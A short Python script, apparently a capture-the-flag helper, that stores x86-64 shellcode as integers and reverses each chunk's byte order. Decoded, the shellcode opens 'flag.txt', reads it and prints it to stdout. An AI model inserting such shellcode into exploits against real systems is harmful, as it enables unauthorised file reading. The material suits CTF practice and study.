import sys
#string = sys.argv[1].replace("0x","")
z = "0x"
shellcode = [0x6A01FE0C2448B866,
0x6C61672E74787450,
0x4831F64889E74831,
0xD24D31D2B8020000,
0x700F054889C74889,
0xE648C7C200040000,
0x31C00F0548C7C701,
0x700000B801000000,
0x7F05B83C0000000F
]
new = []
for a in shellcode:
    endian = []
    z = "0x"
    for x in range(0,16,2):
        
        endian.insert(0,hex(a).replace("0x","")[x:x+2])
    for c in endian:
        z += c
    new.append(z + 'n')

for n in new:
    print(n+ ",")
